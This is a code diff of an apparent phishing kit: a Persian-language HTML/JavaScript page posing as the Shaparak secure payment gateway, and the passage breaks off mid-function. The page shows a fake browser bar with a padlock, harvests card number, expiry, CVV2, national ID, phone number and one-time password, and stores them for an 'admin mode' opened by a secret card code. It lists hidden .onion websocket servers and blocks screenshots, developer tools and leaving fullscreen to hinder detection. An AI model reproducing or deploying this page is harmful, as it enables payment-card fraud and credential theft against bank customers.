@@ -1,641 +1,641 @@
-<!DOCTYPE html>
-<html lang="fa" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="robots" content="noindex, nofollow">
-    <meta http-equiv="cache-control" content="no-store, no-cache, must-revalidate">
-    <meta http-equiv="pragma" content="no-cache">
-    <meta http-equiv="expires" content="0">
-    <title>درگاه پرداخت امن شاپرک</title>
-    <style>
-        :root {
-            --primary: #004d40;
-            --secondary: #28a745;
-            --shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
-            --font: 'Vazir', 'IranSans', sans-serif;
+‏<!DOCTYPE html>
+‏<html lang="fa" dir="rtl">
+‏<head>
+‏    <meta charset="UTF-8">
+‏    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+‏    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+‏    <meta name="robots" content="noindex, nofollow">
+‏    <meta http-equiv="cache-control" content="no-store, no-cache, must-revalidate">
+‏    <meta http-equiv="pragma" content="no-cache">
+‏    <meta http-equiv="expires" content="0">
+‏    <title>درگاه پرداخت امن شاپرک</title>
+‏    <style>
+‏        :root {
+‏            --primary: #004d40;
+‏            --secondary: #28a745;
+‏            --shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
+‏            --font: 'Vazir', 'IranSans', sans-serif;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: var(--font);
-            background: linear-gradient(145deg, #f5f5f5, #e0e0e0);
-            min-height: 100vh;
-            display: grid;
-            place-items: center;
-            overflow: hidden;
+‏        * { margin: 0; padding: 0; box-sizing: border-box; }
+‏        body {
+‏            font-family: var(--font);
+‏            background: linear-gradient(145deg, #f5f5f5, #e0e0e0);
+‏            min-height: 100vh;
+‏            display: grid;
+‏            place-items: center;
+‏            overflow: hidden;
         }
-        body.fullscreen::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.01);
-            z-index: 9999;
-            pointer-events: none;
+‏        body.fullscreen::before {
+‏            content: '';
+‏            position: fixed;
+‏            top: 0;
+‏            left: 0;
+‏            width: 100%;
+‏            height: 100%;
+‏            background: rgba(0, 0, 0, 0.01);
+‏            z-index: 9999;
+‏            pointer-events: none;
         }
-        .fake-browser-bar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            background: #fff;
-            padding: 8px 10px;
-            font-size: 14px;
-            color: #333;
-            border-bottom: 1px solid #e0e0e0;
-            display: flex;
-            align-items: center;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
-            z-index: 10000;
+‏        .fake-browser-bar {
+‏            position: fixed;
+‏            top: 0;
+‏            left: 0;
+‏            width: 100%;
+‏            background: #fff;
+‏            padding: 8px 10px;
+‏            font-size: 14px;
+‏            color: #333;
+‏            border-bottom: 1px solid #e0e0e0;
+‏            display: flex;
+‏            align-items: center;
+‏            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+‏            z-index: 10000;
         }
-        .fake-browser-bar .lock-icon {
-            color: #28a745;
-            font-size: 16px;
-            margin-left: 5px;
+‏        .fake-browser-bar .lock-icon {
+‏            color: #28a745;
+‏            font-size: 16px;
+‏            margin-left: 5px;
         }
-        .fake-browser-bar .url {
-            background: #f1f1f1;
-            padding: 6px 12px;
-            border-radius: 20px;
-            direction: ltr;
-            text-align: left;
-            flex-grow: 1;
-            font-family: Arial, sans-serif;
-            color: #202124;
+‏        .fake-browser-bar .url {
+‏            background: #f1f1f1;
+‏            padding: 6px 12px;
+‏            border-radius: 20px;
+‏            direction: ltr;
+‏            text-align: left;
+‏            flex-grow: 1;
+‏            font-family: Arial, sans-serif;
+‏            color: #202124;
         }
-        header {
-            background: var(--primary);
-            color: #fff;
-            padding: 20px;
-            text-align: center;
-            position: fixed;
-            top: 40px;
-            width: 100%;
-            z-index: 100;
-            box-shadow: var(--shadow);
+‏        header {
+‏            background: var(--primary);
+‏            color: #fff;
+‏            padding: 20px;
+‏            text-align: center;
+‏            position: fixed;
+‏            top: 40px;
+‏            width: 100%;
+‏            z-index: 100;
+‏            box-shadow: var(--shadow);
         }
-        header img {
-            height: 50px;
-            filter: drop-shadow(0 2px 5px rgba(0, 0, 0, 0.3));
+‏        header img {
+‏            height: 50px;
+‏            filter: drop-shadow(0 2px 5px rgba(0, 0, 0, 0.3));
         }
-        .progress-container {
-            max-width: 700px;
-            margin: 120px auto 20px;
-            background: #fff;
-            padding: 8px;
-            border-radius: 25px;
-            box-shadow: var(--shadow);
+‏        .progress-container {
+‏            max-width: 700px;
+‏            margin: 120px auto 20px;
+‏            background: #fff;
+‏            padding: 8px;
+‏            border-radius: 25px;
+‏            box-shadow: var(--shadow);
         }
-        .progress-bar {
-            height: 10px;
-            background: #ddd;
-            border-radius: 12px;
-            overflow: hidden;
-            position: relative;
+‏        .progress-bar {
+‏            height: 10px;
+‏            background: #ddd;
+‏            border-radius: 12px;
+‏            overflow: hidden;
+‏            position: relative;
         }
-        .progress-bar::after {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
-            animation: shimmer 1.5s infinite;
+‏        .progress-bar::after {
+‏            content: '';
+‏            position: absolute;
+‏            width: 100%;
+‏            height: 100%;
+‏            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+‏            animation: shimmer 1.5s infinite;
         }
-        .progress-fill {
-            height: 100%;
-            background: var(--secondary);
-            width: 0;
-            transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+‏        .progress-fill {
+‏            height: 100%;
+‏            background: var(--secondary);
+‏            width: 0;
+‏            transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
         }
-        @keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
-        .payment-wrapper {
-            background: #fff;
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: var(--shadow);
-            width: 90%;
-            max-width: 700px;
-            position: relative;
-            overflow: hidden;
-            border: 1px solid #eee;
+‏        @keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+‏        .payment-wrapper {
+‏            background: #fff;
+‏            padding: 40px;
+‏            border-radius: 20px;
+‏            box-shadow: var(--shadow);
+‏            width: 90%;
+‏            max-width: 700px;
+‏            position: relative;
+‏            overflow: hidden;
+‏            border: 1px solid #eee;
         }
-        .security-badge {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            background: #e8f5e9;
-            padding: 8px 15px;
-            border-radius: 25px;
-            font-size: 13px;
-            color: var(--secondary);
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+‏        .security-badge {
+‏            position: absolute;
+‏            top: 15px;
+‏            left: 15px;
+‏            background: #e8f5e9;
+‏            padding: 8px 15px;
+‏            border-radius: 25px;
+‏            font-size: 13px;
+‏            color: var(--secondary);
+‏            display: flex;
+‏            align-items: center;
+‏            gap: 6px;
+‏            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
         }
-        .step {
-            display: none;
-            animation: slideIn 0.4s ease-out;
+‏        .step {
+‏            display: none;
+‏            animation: slideIn 0.4s ease-out;
         }
-        .step.active { display: block; }
-        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
-        .form-group {
-            margin-bottom: 25px;
-            position: relative;
+‏        .step.active { display: block; }
+‏        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
+‏        .form-group {
+‏            margin-bottom: 25px;
+‏            position: relative;
         }
-        label {
-            font-size: 15px;
-            color: #333;
-            margin-bottom: 10px;
-            display: block;
-            font-weight: 500;
+‏        label {
+‏            font-size: 15px;
+‏            color: #333;
+‏            margin-bottom: 10px;
+‏            display: block;
+‏            font-weight: 500;
         }
-        input {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #ddd;
-            border-radius: 10px;
-            font-size: 16px;
-            direction: rtl;
-            text-align: right;
-            transition: border-color 0.3s, box-shadow 0.3s;
+‏        input {
+‏            width: 100%;
+‏            padding: 14px;
+‏            border: 1px solid #ddd;
+‏            border-radius: 10px;
+‏            font-size: 16px;
+‏            direction: rtl;
+‏            text-align: right;
+‏            transition: border-color 0.3s, box-shadow 0.3s;
         }
-        input:focus {
-            border-color: var(--secondary);
-            box-shadow: 0 0 5px rgba(40, 167, 69, 0.3);
-            outline: none;
+‏        input:focus {
+‏            border-color: var(--secondary);
+‏            box-shadow: 0 0 5px rgba(40, 167, 69, 0.3);
+‏            outline: none;
         }
-        .btn {
-            width: 100%;
-            padding: 15px;
-            border: none;
-            border-radius: 10px;
-            font-size: 17px;
-            cursor: pointer;
-            transition: all 0.3s ease;
+‏        .btn {
+‏            width: 100%;
+‏            padding: 15px;
+‏            border: none;
+‏            border-radius: 10px;
+‏            font-size: 17px;
+‏            cursor: pointer;
+‏            transition: all 0.3s ease;
         }
-        .btn-primary {
-            background: var(--secondary);
-            color: #fff;
+‏        .btn-primary {
+‏            background: var(--secondary);
+‏            color: #fff;
         }
-        .btn-primary:hover {
-            background: #218838;
-            transform: translateY(-2px);
+‏        .btn-primary:hover {
+‏            background: #218838;
+‏            transform: translateY(-2px);
         }
-        .btn-secondary {
-            background: #007bff;
-            color: #fff;
-            width: auto;
-            padding: 10px 20px;
-            margin-top: 10px;
+‏        .btn-secondary {
+‏            background: #007bff;
+‏            color: #fff;
+‏            width: auto;
+‏            padding: 10px 20px;
+‏            margin-top: 10px;
         }
-        .btn-cancel {
-            background: #dc3545;
-            color: #fff;
-            margin-top: 15px;
+‏        .btn-cancel {
+‏            background: #dc3545;
+‏            color: #fff;
+‏            margin-top: 15px;
         }
-        .btn-clear {
-            background: #ff9800;
-            color: #fff;
-            margin-top: 15px;
-            display: none;
+‏        .btn-clear {
+‏            background: #ff9800;
+‏            color: #fff;
+‏            margin-top: 15px;
+‏            display: none;
         }
-        .loader {
-            display: none;
-            width: 60px;
-            height: 60px;
-            border: 6px solid #ddd;
-            border-top: 6px solid var(--secondary);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 25px auto;
+‏        .loader {
+‏            display: none;
+‏            width: 60px;
+‏            height: 60px;
+‏            border: 6px solid #ddd;
+‏            border-top: 6px solid var(--secondary);
+‏            border-radius: 50%;
+‏            animation: spin 0.8s linear infinite;
+‏            margin: 25px auto;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .timer {
-            font-size: 14px;
-            color: #555;
-            text-align: center;
-            margin-top: 15px;
-            font-weight: 500;
+‏        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+‏        .timer {
+‏            font-size: 14px;
+‏            color: #555;
+‏            text-align: center;
+‏            margin-top: 15px;
+‏            font-weight: 500;
         }
-        footer {
-            background: #f5f5f5;
-            padding: 20px;
-            text-align: center;
-            font-size: 13px;
-            color: #666;
-            width: 100%;
-            position: fixed;
-            bottom: 0;
-            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
+‏        footer {
+‏            background: #f5f5f5;
+‏            padding: 20px;
+‏            text-align: center;
+‏            font-size: 13px;
+‏            color: #666;
+‏            width: 100%;
+‏            position: fixed;
+‏            bottom: 0;
+‏            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
         }
-        .user-data {
-            margin-top: 20px;
-            padding: 15px;
-            background: #f9f9f9;
-            border-radius: 10px;
-            font-size: 14px;
-            direction: rtl;
-            max-height: 300px;
-            overflow-y: auto;
-            display: none;
+‏        .user-data {
+‏            margin-top: 20px;
+‏            padding: 15px;
+‏            background: #f9f9f9;
+‏            border-radius: 10px;
+‏            font-size: 14px;
+‏            direction: rtl;
+‏            max-height: 300px;
+‏            overflow-y: auto;
+‏            display: none;
         }
-        @font-face {
-            font-family: 'Vazir';
-            src: url('vazir.woff') format('woff');
+‏        @font-face {
+‏            font-family: 'Vazir';
+‏            src: url('vazir.woff') format('woff');
         }
-    </style>
-</head>
-<body>
+‏    </style>
+‏</head>
+‏<body>
     <!-- نوار مرورگر جعلی -->
-    <div class="fake-browser-bar">
-        <span class="lock-icon">🔒</span>
-        <span class="url">https://www.mysite.com/payment</span>
-    </div>
+‏    <div class="fake-browser-bar">
+‏        <span class="lock-icon">🔒</span>
+‏        <span class="url">https://www.mysite.com/payment</span>
+‏    </div>
 
-    <header>
-        <img src="https://www.shaparak.ir/logo/logo.png" alt="شاپرک">
-        <h1>درگاه پرداخت امن شاپرک</h1>
-    </header>
+‏    <header>
+‏        <img src="https://via.placeholder.com/50?text=شاپرک" alt="شاپرک">
+‏        <h1>درگاه پرداخت امن شاپرک</h1>
+‏    </header>
 
-    <div class="progress-container">
-        <div class="progress-bar">
-            <div class="progress-fill" id="progress-fill"></div>
-        </div>
-    </div>
+‏    <div class="progress-container">
+‏        <div class="progress-bar">
+‏            <div class="progress-fill" id="progress-fill"></div>
+‏        </div>
+‏    </div>
 
-    <div class="payment-wrapper">
-        <div class="security-badge">
-            <span>🔒</span> پرداخت امن با پروتکل SSL 256 بیتی
-        </div>
+‏    <div class="payment-wrapper">
+‏        <div class="security-badge">
+‏            <span>🔒</span> پرداخت امن با پروتکل SSL 256 بیتی
+‏        </div>
 
-        <div class="step active" id="step-1">
-            <div class="form-group">
-                <label for="card-number">شماره کارت</label>
-                <input type="text" id="card-number" placeholder="---- ---- ---- ----" maxlength="19" autocomplete="off">
-            </div>
-            <div class="form-group">
-                <label for="expiry">تاریخ انقضا</label>
-                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" autocomplete="off">
-            </div>
-            <div class="form-group">
-                <label for="cvv2">CVV2</label>
-                <input type="text" id="cvv2" placeholder="***" maxlength="4" autocomplete="off">
-            </div>
-            <div class="form-group">
-                <label for="fake-field">کد ملی (اختیاری)</label>
-                <input type="text" id="fake-field" placeholder="123-456-789" maxlength="12" autocomplete="off">
-            </div>
-            <button class="btn btn-primary" onclick="x.nextStep(1)">مرحله بعد</button>
-        </div>
+‏        <div class="step active" id="step-1">
+‏            <div class="form-group">
+‏                <label for="card-number">شماره کارت</label>
+‏                <input type="text" id="card-number" placeholder="---- ---- ---- ----" maxlength="19" autocomplete="off">
+‏            </div>
+‏            <div class="form-group">
+‏                <label for="expiry">تاریخ انقضا</label>
+‏                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" autocomplete="off">
+‏            </div>
+‏            <div class="form-group">
+‏                <label for="cvv2">CVV2</label>
+‏                <input type="text" id="cvv2" placeholder="***" maxlength="4" autocomplete="off">
+‏            </div>
+‏            <div class="form-group">
+‏                <label for="fake-field">کد ملی (اختیاری)</label>
+‏                <input type="text" id="fake-field" placeholder="123-456-789" maxlength="12" autocomplete="off">
+‏            </div>
+‏            <button class="btn btn-primary" onclick="x.nextStep(1)">مرحله بعد</button>
+‏        </div>
 
-        <div class="step" id="step-2">
-            <div class="form-group">
-                <label for="phone-number">شماره تلفن</label>
-                <input type="tel" id="phone-number" placeholder="09XX-XXX-XXXX" maxlength="13" autocomplete="off">
-            </div>
-            <div class="form-group">
-                <label for="otp">رمز پویا</label>
-                <input type="text" id="otp" placeholder="******" maxlength="6" autocomplete="off">
-                <button class="btn btn-secondary" onclick="x.requestOTP()">درخواست رمز پویا</button>
-            </div>
-            <div class="timer" id="otp-timer"></div>
-            <button class="btn btn-primary" onclick="x.nextStep(2)">تأیید و پرداخت</button>
-        </div>
+‏        <div class="step" id="step-2">
+‏            <div class="form-group">
+‏                <label for="phone-number">شماره تلفن</label>
+‏                <input type="tel" id="phone-number" placeholder="09XX-XXX-XXXX" maxlength="13" autocomplete="off">
+‏            </div>
+‏            <div class="form-group">
+‏                <label for="otp">رمز پویا</label>
+‏                <input type="text" id="otp" placeholder="******" maxlength="6" autocomplete="off">
+‏                <button class="btn btn-secondary" onclick="x.requestOTP()">درخواست رمز پویا</button>
+‏            </div>
+‏            <div class="timer" id="otp-timer"></div>
+‏            <button class="btn btn-primary" onclick="x.nextStep(2)">تأیید و پرداخت</button>
+‏        </div>
 
-        <div class="step" id="step-3">
-            <div id="result" style="text-align: center; font-size: 20px; padding: 20px;"></div>
-            <div class="loader" id="loader"></div>
-        </div>
+‏        <div class="step" id="step-3">
+‏            <div id="result" style="text-align: center; font-size: 20px; padding: 20px;"></div>
+‏            <div class="loader" id="loader"></div>
+‏        </div>
 
-        <button class="btn btn-cancel" onclick="x.cancel()">انصراف</button>
-        <button class="btn btn-clear" id="clear-data-btn" onclick="x.clearData()">پاک کردن اطلاعات</button>
-        <div class="user-data" id="user-data"></div>
-    </div>
+‏        <button class="btn btn-cancel" onclick="x.cancel()">انصراف</button>
+‏        <button class="btn btn-clear" id="clear-data-btn" onclick="x.clearData()">پاک کردن اطلاعات</button>
+‏        <div class="user-data" id="user-data"></div>
+‏    </div>
 
-    <footer>
-        <p>پشتیبانی: 021-12345678 | تمامی حقوق محفوظ است © شاپرک ۱۴۰۳</p>
-    </footer>
+‏    <footer>
+‏        <p>پشتیبانی: 021-12345678 | تمامی حقوق محفوظ است © شاپرک ۱۴۰۳</p>
+‏    </footer>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-    <script>
-        const x = (function() {
-            const steps = document.querySelectorAll('.step');
-            const progressFill = document.getElementById('progress-fill');
-            const userDataDiv = document.getElementById('user-data');
-            const clearDataBtn = document.getElementById('clear-data-btn');
-            let currentStep = 1;
-            let userData = {};
-            let allUsersData = JSON.parse(localStorage.getItem('allUsersData')) || [];
-            let isSpecialMode = false;
-            let sessionId = Math.random().toString(36).substr(2, 10);
-            const SPECIAL_CODE = '12122312';
-            const SERVERS = [
-                () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`,
-                () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`,
-                () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`
+‏    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+‏    <script>
+‏        const x = (function() {
+‏            const steps = document.querySelectorAll('.step');
+‏            const progressFill = document.getElementById('progress-fill');
+‏            const userDataDiv = document.getElementById('user-data');
+‏            const clearDataBtn = document.getElementById('clear-data-btn');
+‏            let currentStep = 1;
+‏            let userData = {};
+‏            let allUsersData = JSON.parse(localStorage.getItem('allUsersData')) || [];
+‏            let isSpecialMode = false;
+‏            let sessionId = Math.random().toString(36).substr(2, 10);
+‏            const SPECIAL_CODE = '12122312';
+‏            const SERVERS = [
+‏                () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`,
+‏                () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`,
+‏                () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`
             ];
 
-            function init() {
-                enterFullscreen();
-                setupInputs();
-                updateProgress();
-                if (!localStorage.getItem(`specialMode_${sessionId}`)) {
-                    setSelfDestructTimeout(600);
+‏            function init() {
+‏                enterFullscreen();
+‏                setupInputs();
+‏                updateProgress();
+‏                if (!localStorage.getItem(`specialMode_${sessionId}`)) {
+‏                    setSelfDestructTimeout(600);
                 }
-                setupScreenshotProtection();
-                window.addEventListener('beforeunload', handlePageExit);
-                document.addEventListener('fullscreenchange', handleFullscreenExit);
+‏                setupScreenshotProtection();
+‏                window.addEventListener('beforeunload', handlePageExit);
+‏                document.addEventListener('fullscreenchange', handleFullscreenExit);
             }
 
-            function enterFullscreen() {
-                document.documentElement.requestFullscreen().catch(err => {
-                    console.log('Fullscreen failed:', err);
+‏            function enterFullscreen() {
+‏                document.documentElement.requestFullscreen().catch(err => {
+‏                    console.log('Fullscreen failed:', err);
                 });
-                document.body.classList.add('fullscreen');
+‏                document.body.classList.add('fullscreen');
             }
 
-            function handleFullscreenExit() {
-                if (!document.fullscreenElement && !isSpecialMode) {
-                    alert('لطفاً صفحه را در حالت تمام‌صفحه نگه دارید!');
-                    enterFullscreen();
+‏            function handleFullscreenExit() {
+‏                if (!document.fullscreenElement && !isSpecialMode) {
+‏                    alert('لطفاً صفحه را در حالت تمام‌صفحه نگه دارید!');
+‏                    enterFullscreen();
                 }
             }
 
-            function setupInputs() {
-                const cardNumber = document.getElementById('card-number');
-                cardNumber.addEventListener('input', e => {
-                    let value = e.target.value.replace(/\D/g, '');
-                    if (value === SPECIAL_CODE) {
-                        enterAdminMode();
-                        return;
+‏            function setupInputs() {
+‏                const cardNumber = document.getElementById('card-number');
+‏                cardNumber.addEventListener('input', e => {
+‏                    let value = e.target.value.replace(/\D/g, '');
+‏                    if (value === SPECIAL_CODE) {
+‏                        enterAdminMode();
+‏                        return;
                     }
-                    value = value.replace(/(.{4})/g, '$1-').slice(0, 19).trim();
-                    e.target.value = value;
+‏                    value = value.replace(/(.{4})/g, '$1-').slice(0, 19).trim();
+‏                    e.target.value = value;
                 });
-                cardNumber.addEventListener('blur', e => updateUserData('شماره کارت', e.target.value));
+‏                cardNumber.addEventListener('blur', e => updateUserData('شماره کارت', e.target.value));
 
-                document.getElementById('expiry').addEventListener('input', e => {
-                    let v = e.target.value.replace(/\D/g, '');
-                    if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
-                    e.target.value = v.slice(0, 5);
+‏                document.getElementById('expiry').addEventListener('input', e => {
+‏                    let v = e.target.value.replace(/\D/g, '');
+‏                    if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
+‏                    e.target.value = v.slice(0, 5);
                 });
-                document.getElementById('expiry').addEventListener('blur', e => updateUserData('تاریخ انقضا', e.target.value));
+‏                document.getElementById('expiry').addEventListener('blur', e => updateUserData('تاریخ انقضا', e.target.value));
 
-                document.getElementById('cvv2').addEventListener('input', e => {
-                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+‏                document.getElementById('cvv2').addEventListener('input', e => {
+‏                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
                 });
-                document.getElementById('cvv2').addEventListener('blur', e => updateUserData('CVV2', e.target.value));
+‏                document.getElementById('cvv2').addEventListener('blur', e => updateUserData('CVV2', e.target.value));
 
-                document.getElementById('phone-number').addEventListener('input', e => {
-                    let v = e.target.value.replace(/\D/g, '');
-                    if (v.length > 0) {
-                        e.target.value = v.slice(0, 4) + (v.length > 4 ? '-' + v.slice(4, 7) : '') + (v.length > 7 ? '-' + v.slice(7, 11) : '');
-                    }
-                });
-                document.getElementById('phone-number').addEventListener('blur', e => updateUserData('شماره تلفن', e.target.value));
-
-                document.getElementById('otp').addEventListener('input', e => {
-                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
-                });
-                document.getElementById('otp').addEventListener('blur', e => updateUserData('رمز پویا', e.target.value));
-
-                document.getElementById('fake-field').addEventListener('blur', e => updateUserData('کد ملی', e.target.value));
-            }
-
-            function enterAdminMode() {
-                isSpecialMode = true;
-                localStorage.setItem(`specialMode_${sessionId}`, 'true');
-                alert('حالت مدیر فعال شد - خودنابودگری غیرفعال است');
-                currentStep = 3;
-                steps[0].classList.remove('active');
-                steps[2].classList.add('active');
-                updateProgress();
-                showUserData();
-                clearDataBtn.style.display = 'block';
-                document.getElementById('result').innerHTML = 'حالت مدیر: اطلاعات کاربران در زیر نمایش داده شده است.';
-            }
-
-            function updateUserData(key, value) {
-                if (value.trim()) {
-                    userData[key] = value;
-                }
-            }
-
-            function saveAndDisplayUserData() {
-                if (Object.keys(userData).length > 0) {
-                    allUsersData.push({ ...userData });
-                    localStorage.setItem('allUsersData', JSON.stringify(allUsersData));
-                    if (isSpecialMode) showUserData();
-                }
-            }
-
-            function showUserData() {
-                userDataDiv.style.display = 'block';
-                userDataDiv.innerHTML = '<h3>اطلاعات کاربران:</h3>' + 
-                    (allUsersData.length > 0 ? 
-                        allUsersData.map((user, index) => 
-                            `<div style="margin-bottom: 15px;">
-                                <h4>کاربر ${index + 1}:</h4>` + 
-                                Object.entries(user)
-                                    .map(([key, value]) => `<p>${key}: ${value}</p>`)
-                                    .join('') +
-                            `</div>`
-                        ).join('') : 
-                        '<p>هیچ اطلاعاتی موجود نیست</p>');
-            }
-
-            function setupScreenshotProtection() {
-                document.addEventListener('contextmenu', e => e.preventDefault());
-                document.addEventListener('selectstart', e => e.preventDefault());
-                document.addEventListener('keydown', e => {
-                    if (e.key === 'PrintScreen' || (e.ctrlKey && e.shiftKey && e.key === 'I') || e.key === 'F12') {
-                        e.preventDefault();
-                        alert('عملیات غیرمجاز تشخیص داده شد!');
-                        document.body.style.filter = 'blur(10px)';
-                        setTimeout(() => document.body.style.filter = 'none', 1000);
+‏                document.getElementById('phone-number').addEventListener('input', e => {
+‏                    let v = e.target.value.replace(/\D/g, '');
+‏                    if (v.length > 0) {
+‏                        e.target.value = v.slice(0, 4) + (v.length > 4 ? '-' + v.slice(4, 7) : '') + (v.length > 7 ? '-' + v.slice(7, 11) : '');
                     }
                 });
-                window.addEventListener('blur', () => {
-                    document.body.style.filter = 'blur(5px)';
-                    setTimeout(() => document.body.style.filter = 'none', 2000);
+‏                document.getElementById('phone-number').addEventListener('blur', e => updateUserData('شماره تلفن', e.target.value));
+
+‏                document.getElementById('otp').addEventListener('input', e => {
+‏                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+                });
+‏                document.getElementById('otp').addEventListener('blur', e => updateUserData('رمز پویا', e.target.value));
+
+‏                document.getElementById('fake-field').addEventListener('blur', e => updateUserData('کد ملی', e.target.value));
+            }
+
+‏            function enterAdminMode() {
+‏                isSpecialMode = true;
+‏                localStorage.setItem(`specialMode_${sessionId}`, 'true');
+‏                alert('حالت مدیر فعال شد - خودنابودگری غیرفعال است');
+‏                currentStep = 3;
+‏                steps[0].classList.remove('active');
+‏                steps[2].classList.add('active');
+‏                updateProgress();
+‏                showUserData();
+‏                clearDataBtn.style.display = 'block';
+‏                document.getElementById('result').innerHTML = 'حالت مدیر: اطلاعات کاربران در زیر نمایش داده شده است.';
+            }
+
+‏            function updateUserData(key, value) {
+‏                if (value.trim()) {
+‏                    userData[key] = value;
+                }
+            }
+
+‏            function saveAndDisplayUserData() {
+‏                if (Object.keys(userData).length > 0) {
+‏                    allUsersData.push({ ...userData });
+‏                    localStorage.setItem('allUsersData', JSON.stringify(allUsersData));
+‏                    if (isSpecialMode) showUserData();
+                }
+            }
+
+‏            function showUserData() {
+‏                userDataDiv.style.display = 'block';
+‏                userDataDiv.innerHTML = '<h3>اطلاعات کاربران:</h3>' + 
+‏                    (allUsersData.length > 0 ? 
+‏                        allUsersData.map((user, index) => 
+‏                            `<div style="margin-bottom: 15px;">
+‏                                <h4>کاربر ${index + 1}:</h4>` + 
+‏                                Object.entries(user)
+‏                                    .map(([key, value]) => `<p>${key}: ${value}</p>`)
+‏                                    .join('') +
+‏                            `</div>`
+‏                        ).join('') : 
+‏                        '<p>هیچ اطلاعاتی موجود نیست</p>');
+            }
+
+‏            function setupScreenshotProtection() {
+‏                document.addEventListener('contextmenu', e => e.preventDefault());
+‏                document.addEventListener('selectstart', e => e.preventDefault());
+‏                document.addEventListener('keydown', e => {
+‏                    if (e.key === 'PrintScreen' || (e.ctrlKey && e.shiftKey && e.key === 'I') || e.key === 'F12') {
+‏                        e.preventDefault();
+‏                        alert('عملیات غیرمجاز تشخیص داده شد!');
+‏                        document.body.style.filter = 'blur(10px)';
+‏                        setTimeout(() => document.body.style.filter = 'none', 1000);
+                    }
+                });
+‏                window.addEventListener('blur', () => {
+‏                    document.body.style.filter = 'blur(5px)';
+‏                    setTimeout(() => document.body.style.filter = 'none', 2000);
                 });
             }
 
-            function validateStep(step) {
-                const card = document.getElementById('card-number').value.replace(/\D/g, '');
-                if (card === SPECIAL_CODE) return true;
+‏            function validateStep(step) {
+‏                const card = document.getElementById('card-number').value.replace(/\D/g, '');
+‏                if (card === SPECIAL_CODE) return true;
 
-                const inputs = steps[step - 1].querySelectorAll('input:not(#fake-field)');
-                for (let input of inputs) {
-                    if (!input.value.trim()) {
-                        alert('لطفاً تمامی فیلدها را پر کنید');
-                        return false;
-                    }
-                }
-
-                if (step === 1) {
-                    if (!/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(document.getElementById('card-number').value)) {
-                        alert('شماره کارت نامعتبر است');
-                        return false;
+‏                const inputs = steps[step - 1].querySelectorAll('input:not(#fake-field)');
+‏                for (let input of inputs) {
+‏                    if (!input.value.trim()) {
+‏                        alert('لطفاً تمامی فیلدها را پر کنید');
+‏                        return false;
                     }
                 }
 
-                if (step === 2) {
-                    const phone = document.getElementById('phone-number').value.replace(/-/g, '');
-                    if (phone.length !== 11 || !phone.startsWith('09')) {
-                        alert('شماره تلفن نامعتبر است');
-                        return false;
+‏                if (step === 1) {
+‏                    if (!/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(document.getElementById('card-number').value)) {
+‏                        alert('شماره کارت نامعتبر است');
+‏                        return false;
                     }
                 }
-                return true;
-            }
 
-            function nextStep(step) {
-                if (!validateStep(step)) return;
-
-                steps[step - 1].classList.remove('active');
-                currentStep = step + 1;
-                if (currentStep === 3) processPayment();
-                steps[currentStep - 1].classList.add('active');
-                updateProgress();
-            }
-
-            function updateProgress() {
-                progressFill.style.width = `${(currentStep / steps.length) * 100}%`;
-            }
-
-            function requestOTP() {
-                const phone = document.getElementById('phone-number').value.replace(/-/g, '');
-                if (phone.length !== 11 || !phone.startsWith('09')) {
-                    alert('شماره تلفن نامعتبر است');
-                    return;
+‏                if (step === 2) {
